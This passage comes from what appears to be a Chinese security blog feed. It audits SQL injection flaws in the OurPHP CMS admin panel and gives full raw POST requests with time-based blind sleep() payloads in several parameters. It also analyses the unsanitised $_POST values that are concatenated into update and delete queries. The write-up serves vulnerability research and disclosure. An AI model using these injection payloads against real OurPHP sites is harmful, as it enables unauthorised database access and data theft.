class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">68</span><br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://localhost/client/manage/ourphp_cmd.php?ourphp_cms=cmd<br><span class="hljs-attribute">Cookie</span>: cookieconsent_status=dismiss; Phpstorm-<span class="hljs-number">8</span>e<span class="hljs-number">4</span>b<span class="hljs-number">56</span>ac=beb<span class="hljs-number">94186</span>-<span class="hljs-number">86</span>bf-<span class="hljs-number">4</span>a<span class="hljs-number">9</span>d-<span class="hljs-number">832</span>a-<span class="hljs-number">863045</span>cf<span class="hljs-number">4</span>b<span class="hljs-number">2</span>f; Hm_lvt_c<span class="hljs-number">12</span>f<span class="hljs-number">88</span>b<span class="hljs-number">5</span>c<span class="hljs-number">1</span>cd<span class="hljs-number">041</span>a<span class="hljs-number">732</span>dea<span class="hljs-number">597</span>a<span class="hljs-number">5</span>ec<span class="hljs-number">94</span>c=<span class="hljs-number">1609381035</span>; bdshare_firstime=<span class="hljs-number">1609381035017</span>; Hm_lvt_d<span class="hljs-number">6</span>ceebbfea<span class="hljs-number">56</span>af<span class="hljs-number">954</span>e<span class="hljs-number">58</span>ccea<span class="hljs-number">336</span>c<span class="hljs-number">10</span>d<span class="hljs-number">8</span>=<span class="hljs-number">1612666019</span>,<span class="hljs-number">1614563564</span>; UM_distinctid=<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>c<span class="hljs-number">31</span>-<span class="hljs-number">0</span>aacb<span class="hljs-number">8</span>a<span class="hljs-number">3</span>b<span class="hljs-number">601</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4</span>c<span class="hljs-number">3</span>f<span class="hljs-number">227</span>c-<span class="hljs-number">1</span>fa<span class="hljs-number">400</span>-<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>d<span class="hljs-number">5</span>d<span class="hljs-number">8</span>; CNZZDATA<span class="hljs-number">1277972876</span>=<span class="hljs-number">1856010917</span>-<span class="hljs-number">1614837798</span>-%<span class="hljs-number">7</span>C<span class="hljs-number">1614837798</span>; Hm_lvt_b<span class="hljs-number">60316</span>de<span class="hljs-number">6009</span>d<span class="hljs-number">5654</span>de<span class="hljs-number">7312</span>f<span class="hljs-number">772162</span>be=<span class="hljs-number">1621413156</span>,<span class="hljs-number">1621496582</span>; KCFINDER_showname=<span class="hljs-literal">on</span>; KCFINDER_showsize=<span class="hljs-literal">off</span>; KCFINDER_showtime=<span class="hljs-literal">off</span>; KCFINDER_order=name; KCFINDER_orderDesc=<span class="hljs-literal">off</span>; KCFINDER_view=thumbs; KCFINDER_displaySettings=<span class="hljs-literal">off</span>; PHPSESSID=<span class="hljs-number">8</span>mnhi<span class="hljs-number">745</span>ibl<span class="hljs-number">3</span>qu<span class="hljs-number">7</span>s<span class="hljs-number">3</span>vtem<span class="hljs-number">6</span>tcc<span class="hljs-number">4</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-Site: same-origin<br><br><span class="hljs-attribute">lx</span>=y&amp;lm=<span class="hljs-number">1</span>%<span class="hljs-number">7</span>C<span class="hljs-number">1</span>&amp;xx=article%<span class="hljs-number">60</span>+where+id%<span class="hljs-number">3</span>D<span class="hljs-number">1</span>+and+sleep%<span class="hljs-number">284</span>%<span class="hljs-number">29</span>%<span class="hljs-number">23</span>%<span class="hljs-number">60</span>&amp;id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>编写POC注入得到数据库名</p><p><a href="https://imgtu.com/i/hGohes"><img src="https://z3.ax1x.com/2021/08/29/hGohes.png" alt="hGohes.png"></a></p><h1 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h1><h2 id="ourphp-freightview-php"><a href="#ourphp-freightview-php" class="headerlink" title="ourphp_freightview.php"></a>ourphp_freightview.php</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>POST数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /client/manage/ourphp_freightview.php?ourphp_cms=edit HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">37</span><br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://localhost/client/manage/ourphp_freight.php?id=ourphp<br><span class="hljs-attribute">Cookie</span>: cookieconsent_status=dismiss; Phpstorm-<span class="hljs-number">8</span>e<span class="hljs-number">4</span>b<span class="hljs-number">56</span>ac=beb<span class="hljs-number">94186</span>-<span class="hljs-number">86</span>bf-<span class="hljs-number">4</span>a<span class="hljs-number">9</span>d-<span class="hljs-number">832</span>a-<span class="hljs-number">863045</span>cf<span class="hljs-number">4</span>b<span class="hljs-number">2</span>f; Hm_lvt_c<span class="hljs-number">12</span>f<span class="hljs-number">88</span>b<span class="hljs-number">5</span>c<span class="hljs-number">1</span>cd<span class="hljs-number">041</span>a<span class="hljs-number">732</span>dea<span class="hljs-number">597</span>a<span class="hljs-number">5</span>ec<span class="hljs-number">94</span>c=<span class="hljs-number">1609381035</span>; bdshare_firstime=<span class="hljs-number">1609381035017</span>; Hm_lvt_d<span class="hljs-number">6</span>ceebbfea<span class="hljs-number">56</span>af<span class="hljs-number">954</span>e<span class="hljs-number">58</span>ccea<span class="hljs-number">336</span>c<span class="hljs-number">10</span>d<span class="hljs-number">8</span>=<span class="hljs-number">1612666019</span>,<span class="hljs-number">1614563564</span>; UM_distinctid=<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>c<span class="hljs-number">31</span>-<span class="hljs-number">0</span>aacb<span class="hljs-number">8</span>a<span class="hljs-number">3</span>b<span class="hljs-number">601</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4</span>c<span class="hljs-number">3</span>f<span class="hljs-number">227</span>c-<span class="hljs-number">1</span>fa<span class="hljs-number">400</span>-<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>d<span class="hljs-number">5</span>d<span class="hljs-number">8</span>; CNZZDATA<span class="hljs-number">1277972876</span>=<span class="hljs-number">1856010917</span>-<span class="hljs-number">1614837798</span>-%<span class="hljs-number">7</span>C<span class="hljs-number">1614837798</span>; Hm_lvt_b<span class="hljs-number">60316</span>de<span class="hljs-number">6009</span>d<span class="hljs-number">5654</span>de<span class="hljs-number">7312</span>f<span class="hljs-number">772162</span>be=<span class="hljs-number">1621413156</span>,<span class="hljs-number">1621496582</span>; KCFINDER_showname=<span class="hljs-literal">on</span>; KCFINDER_showsize=<span class="hljs-literal">off</span>; KCFINDER_showtime=<span class="hljs-literal">off</span>; KCFINDER_order=name; KCFINDER_orderDesc=<span class="hljs-literal">off</span>; KCFINDER_view=thumbs; KCFINDER_displaySettings=<span class="hljs-literal">off</span>; PHPSESSID=kg<span class="hljs-number">48</span>ll<span class="hljs-number">3</span>aapbs<span class="hljs-number">44</span>cfq<span class="hljs-number">0</span>brevk<span class="hljs-number">4</span>fo; <br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-Site: same-origin<br><br><span class="hljs-attribute">sheng</span>%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=<span class="hljs-number">1</span>%<span class="hljs-number">27</span>+and+sleep%<span class="hljs-number">284</span>%<span class="hljs-number">29</span>+%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>延时4秒</p><p><a href="https://imgtu.com/i/hGo7WT"><img src="https://z3.ax1x.com/2021/08/29/hGo7WT.png" alt="hGo7WT.png"></a></p><p>编写POC验证，需要先填写登录后台后的Cookie中的PHPSESSID字段，然后注入得到数据库名</p><p><a href="https://imgtu.com/i/hGobSU"><img src="https://z3.ax1x.com/2021/08/29/hGobSU.png" alt="hGobSU.png"></a></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>/client/manage/ourphp_freightview.php</p><p>可控参数$_POST[“sheng”]被直接拼接入sql语句，造成sql注入</p><p><a href="https://imgtu.com/i/hGvbUe"><img src="https://z3.ax1x.com/2021/08/29/hGvbUe.png" alt="hGvbUe.png"></a></p><p>/config/ourphp_mysqli.php</p><p>拼接update语句</p><p><a href="https://imgtu.com/i/hGvoDK"><img src="https://z3.ax1x.com/2021/08/29/hGvoDK.png" alt="hGvoDK.png"></a></p><h2 id="ourphp-productlist-php"><a href="#ourphp-productlist-php" class="headerlink" title="ourphp_productlist.php"></a>ourphp_productlist.php</h2><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>/client/manage/ourphp_productlist.php</p><p>可控参数$_POST[“op_b”]被直接拼接入sql语句，造成sql注入</p><p><a href="https://imgtu.com/i/hGoOOJ"><img src="https://z3.ax1x.com/2021/08/29/hGoOOJ.png" alt="hGoOOJ.png"></a></p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>POST数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /client/manage/ourphp_productlist.php?ourphp_cms=Batch HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">57</span><br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://localhost/client/manage/ourphp_productlist.php?id=ourphp&amp;aid=<span class="hljs-number">0</span><br><span class="hljs-attribute">Cookie</span>: cookieconsent_status=dismiss; Phpstorm-<span class="hljs-number">8</span>e<span class="hljs-number">4</span>b<span class="hljs-number">56</span>ac=beb<span class="hljs-number">94186</span>-<span class="hljs-number">86</span>bf-<span class="hljs-number">4</span>a<span class="hljs-number">9</span>d-<span class="hljs-number">832</span>a-<span class="hljs-number">863045</span>cf<span class="hljs-number">4</span>b<span class="hljs-number">2</span>f; Hm_lvt_c<span class="hljs-number">12</span>f<span class="hljs-number">88</span>b<span class="hljs-number">5</span>c<span class="hljs-number">1</span>cd<span class="hljs-number">041</span>a<span class="hljs-number">732</span>dea<span class="hljs-number">597</span>a<span class="hljs-number">5</span>ec<span class="hljs-number">94</span>c=<span class="hljs-number">1609381035</span>; bdshare_firstime=<span class="hljs-number">1609381035017</span>; Hm_lvt_d<span class="hljs-number">6</span>ceebbfea<span class="hljs-number">56</span>af<span class="hljs-number">954</span>e<span class="hljs-number">58</span>ccea<span class="hljs-number">336</span>c<span class="hljs-number">10</span>d<span class="hljs-number">8</span>=<span class="hljs-number">1612666019</span>,<span class="hljs-number">1614563564</span>; UM_distinctid=<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>c<span class="hljs-number">31</span>-<span class="hljs-number">0</span>aacb<span class="hljs-number">8</span>a<span class="hljs-number">3</span>b<span class="hljs-number">601</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4</span>c<span class="hljs-number">3</span>f<span class="hljs-number">227</span>c-<span class="hljs-number">1</span>fa<span class="hljs-number">400</span>-<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>d<span class="hljs-number">5</span>d<span class="hljs-number">8</span>; CNZZDATA<span class="hljs-number">1277972876</span>=<span class="hljs-number">1856010917</span>-<span class="hljs-number">1614837798</span>-%<span class="hljs-number">7</span>C<span class="hljs-number">1614837798</span>; Hm_lvt_b<span class="hljs-number">60316</span>de<span class="hljs-number">6009</span>d<span class="hljs-number">5654</span>de<span class="hljs-number">7312</span>f<span class="hljs-number">772162</span>be=<span class="hljs-number">1621413156</span>,<span class="hljs-number">1621496582</span>; KCFINDER_showname=<span class="hljs-literal">on</span>; KCFINDER_showsize=<span class="hljs-literal">off</span>; KCFINDER_showtime=<span class="hljs-literal">off</span>; KCFINDER_order=name; KCFINDER_orderDesc=<span class="hljs-literal">off</span>; KCFINDER_view=thumbs; KCFINDER_displaySettings=<span class="hljs-literal">off</span>; PHPSESSID=kg<span class="hljs-number">48</span>ll<span class="hljs-number">3</span>aapbs<span class="hljs-number">44</span>cfq<span class="hljs-number">0</span>brevk<span class="hljs-number">4</span>fo; XDEBUG_SESSION=<span class="hljs-number">19519</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-Site: same-origin<br><br><span class="hljs-attribute">OP_Attribute</span>=<span class="hljs-number">1</span>&amp;down=<span class="hljs-number">1</span>&amp;op_b%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=<span class="hljs-number">1</span>%<span class="hljs-number">29</span>+and+sleep%<span class="hljs-number">284</span>%<span class="hljs-number">29</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>延时4秒</p><p><a href="https://imgtu.com/i/hGvjgI"><img src="https://z3.ax1x.com/2021/08/29/hGvjgI.png" alt="hGvjgI.png"></a></p><p>编写POC验证，需要先填写登录后台后的Cookie中的PHPSESSID字段，然后注入得到数据库名</p><p><a href="https://imgtu.com/i/hGvq4H"><img src="https://z3.ax1x.com/2021/08/29/hGvq4H.png" alt="hGvq4H.png"></a></p><h1 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h1><h2 id="ourphp-comment"><a href="#ourphp-comment" class="headerlink" title="ourphp_comment"></a>ourphp_comment</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>下载源码：<a href="https://www.ourphp.net/">https://www.ourphp.net/</a></p><p>初始安装后ourphp_comment表默认为空，需要先添加一条数据，模拟实际环境</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">insert</span> into ourphp_comment values(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,null);<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGoqlF"><img src="https://z3.ax1x.com/2021/08/29/hGoqlF.png" alt="hGoqlF.png"></a></p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>登录后台</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost/admin.php<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/hGoLy4"><img src="https://z3.ax1x.com/2021/08/29/hGoLy4.png" alt="hGoLy4.png"></a></p><p>POST数据包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /client/manage/ourphp_comment.php?ourphp_cms=Batch HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>; rv:<span class="hljs-number">91</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">91</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">35</span><br><span class="hljs-attribute">Origin</span>: http://localhost<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://localhost/client/manage/ourphp_comment.php?opcms=articleview<br><span class="hljs-attribute">Cookie</span>: cookieconsent_status=dismiss; Phpstorm-<span class="hljs-number">8</span>e<span class="hljs-number">4</span>b<span class="hljs-number">56</span>ac=beb<span class="hljs-number">94186</span>-<span class="hljs-number">86</span>bf-<span class="hljs-number">4</span>a<span class="hljs-number">9</span>d-<span class="hljs-number">832</span>a-<span class="hljs-number">863045</span>cf<span class="hljs-number">4</span>b<span class="hljs-number">2</span>f; Hm_lvt_c<span class="hljs-number">12</span>f<span class="hljs-number">88</span>b<span class="hljs-number">5</span>c<span class="hljs-number">1</span>cd<span class="hljs-number">041</span>a<span class="hljs-number">732</span>dea<span class="hljs-number">597</span>a<span class="hljs-number">5</span>ec<span class="hljs-number">94</span>c=<span class="hljs-number">1609381035</span>; bdshare_firstime=<span class="hljs-number">1609381035017</span>; Hm_lvt_d<span class="hljs-number">6</span>ceebbfea<span class="hljs-number">56</span>af<span class="hljs-number">954</span>e<span class="hljs-number">58</span>ccea<span class="hljs-number">336</span>c<span class="hljs-number">10</span>d<span class="hljs-number">8</span>=<span class="hljs-number">1612666019</span>,<span class="hljs-number">1614563564</span>; UM_distinctid=<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>c<span class="hljs-number">31</span>-<span class="hljs-number">0</span>aacb<span class="hljs-number">8</span>a<span class="hljs-number">3</span>b<span class="hljs-number">601</span>b<span class="hljs-number">4</span>-<span class="hljs-number">4</span>c<span class="hljs-number">3</span>f<span class="hljs-number">227</span>c-<span class="hljs-number">1</span>fa<span class="hljs-number">400</span>-<span class="hljs-number">177</span>fbd<span class="hljs-number">5550</span>d<span class="hljs-number">5</span>d<span class="hljs-number">8</span>; CNZZDATA<span class="hljs-number">1277972876</span>=<span class="hljs-number">1856010917</span>-<span class="hljs-number">1614837798</span>-%<span class="hljs-number">7</span>C<span class="hljs-number">1614837798</span>; Hm_lvt_b<span class="hljs-number">60316</span>de<span class="hljs-number">6009</span>d<span class="hljs-number">5654</span>de<span class="hljs-number">7312</span>f<span class="hljs-number">772162</span>be=<span class="hljs-number">1621413156</span>,<span class="hljs-number">1621496582</span>; KCFINDER_showname=<span class="hljs-literal">on</span>; KCFINDER_showsize=<span class="hljs-literal">off</span>; KCFINDER_showtime=<span class="hljs-literal">off</span>; KCFINDER_order=name; KCFINDER_orderDesc=<span class="hljs-literal">off</span>; KCFINDER_view=thumbs; KCFINDER_displaySettings=<span class="hljs-literal">off</span>; qpangecmsdodbdata=empirecms; qpangloginuserid=<span class="hljs-number">1</span>; qpangloginusername=admin; qpangloginrnd=yhUbx<span class="hljs-number">4</span>MwtFOE<span class="hljs-number">4</span>mLMovWa; qpangloginlevel=<span class="hljs-number">1</span>; qpangeloginlic=empirecmslic; qpangloginadminstyleid=<span class="hljs-number">1</span>; qpangloginecmsckpass=<span class="hljs-number">8</span>ffffef<span class="hljs-number">8</span>ae<span class="hljs-number">38</span>e<span class="hljs-number">141666</span>d<span class="hljs-number">4</span>a<span class="hljs-number">8</span>b<span class="hljs-number">096370</span>ad; qpangloginecmsckfrnd=<span class="hljs-number">77</span>qtyTZsm<span class="hljs-number">7</span>dy<span class="hljs-number">462</span>zBYuoQpyUxjx; qpangloginecmsckfdef=IPhyaqEeYt<span class="hljs-number">8</span>ntQE<span class="hljs-number">1</span>FCXoTX; qpangemecpnILWpke=<span class="hljs-number">9</span>vv<span class="hljs-number">8</span>VCF<span class="hljs-number">6</span>xBRHas<span class="hljs-number">5</span>l<span class="hljs-number">6</span>U; qpanglogintime=<span class="hljs-number">1629354760</span>; qpangtruelogintime=<span class="hljs-number">1629352354</span>; PHPSESSID=s<span class="hljs-number">218</span>f<span class="hljs-number">45</span>l<span class="hljs-number">5</span>l<span class="hljs-number">1</span>v<span class="hljs-number">9</span>n<span class="hljs-number">1</span>bm<span class="hljs-number">1</span>lf<span class="hljs-number">6</span>junhb; XDEBUG_SESSION=<span class="hljs-number">19519</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-Site: same-origin<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><br><span class="hljs-attribute">op_b</span>%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D=-<span class="hljs-number">1</span>%<span class="hljs-number">29</span>+or+sleep%<span class="hljs-number">284</span>%<span class="hljs-number">29</span>%<span class="hljs-number">23</span><br></code></pre></td></tr></table></figure><p>延时四秒</p><p><a href="https://imgtu.com/i/hGvTHO"><img src="https://z3.ax1x.com/2021/08/29/hGvTHO.png" alt="hGvTHO.png"></a></p><p>编写POC验证，需要先填写登录后台后的Cookie中的PHPSESSID字段，然后注入得到数据库名</p><p><a href="https://imgtu.com/i/hGvzKP"><img src="https://z3.ax1x.com/2021/08/29/hGvzKP.png" alt="hGvzKP.png"></a></p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>/client/manage/ourphp_comment.php</p><p>可控参数$_POST[“op_b”]直接拼接入sql语句，造成sql注入</p><p><a href="https://imgtu.com/i/hGooF0"><img src="https://z3.ax1x.com/2021/08/29/hGooF0.png" alt="hGooF0.png"></a></p><p>/config/ourphp_mysqli.php</p><p>del方法直接拼接sql语句</p><p><a href="https://imgtu.com/i/hGoTYV"><img src="https://z3.ax1x.com/2021/08/29/hGoTYV.png" alt="hGoTYV.png"></a></p><p>实际执行的sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> ourphp_comment <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> <span class="hljs-keyword">in</span> (<span class="hljs-number">-1</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">4</span>)<span class="hljs-comment">#)</span><br></code></pre></td></tr></table></figure><p>剩余三处delete注入原理相同，不再赘述</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码审计：HulaCWMS后台phar反序列化漏洞</title>
    <link href="/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AHulaCWMS%E5%90%8E%E5%8F%B0phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2021/08/29/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AHulaCWMS%E5%90%8E%E5%8F%B0phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
